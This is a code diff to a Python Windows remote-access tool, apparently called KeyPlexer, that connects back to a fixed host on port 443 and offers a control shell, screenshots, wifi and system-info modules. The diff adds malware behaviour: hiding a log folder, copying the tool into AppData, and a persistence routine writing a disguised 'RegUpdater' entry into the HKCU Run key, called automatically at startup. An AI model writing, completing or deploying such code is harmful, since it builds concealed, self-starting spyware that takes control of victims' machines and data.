@@ -11,6 +11,9 @@ from modules.screenshots import *
 from modules.wifi import *
 from modules.system_info import *
 from modules.cover import *
+from shutil import copytree, ignore_patterns
+
+import _winreg as wreg
 import socket 
 import subprocess, os
 from socket import *
@@ -22,6 +25,11 @@ import hashlib
 
 host = "10.0.0.59"
 port = 443
+
+
+current_path = os.path.dirname(os.getcwd()) + "\\"
+base_path = os.path.join(os.path.expandvars("%userprofile%\\AppData"))
+dest_path = base_path+ "\\online\\"
 
 
 def transfer(s,path):
@@ -163,9 +171,33 @@ def control_shell():
                   break
                                   
                 
+def hide_file(file_path):
+
+   """This function hides the folder of logs"""
+   
+   return win32file.SetFileAttributes(file_path, win32file.FILE_ATTRIBUTE_HIDDEN)
 
 
+def copy_folder(des_path):
+
+    if os.path.exists(dest_path):
+
+        shutil.rmtree(dest_path)
         
+    copytree(current_path, dest_path, ignore=ignore_patterns('*.pyc', 'tmp*'))        
+         
+
+destintaion ="C:\Users\key\Documents\test\Test\KeyPlexer.exe"
+
+def persistance():
+
+    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",wreg.KEY_SET_VALUE,
+                         wreg.KEY_ALL_ACCESS)
+   
+    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ ,destintaion)
+    key.Close()
+
+    
          
 
 def main():
@@ -173,4 +205,6 @@ def main():
     control_shell()
 
 
+#copy_folder(dest_path)
+persistance()
 main()
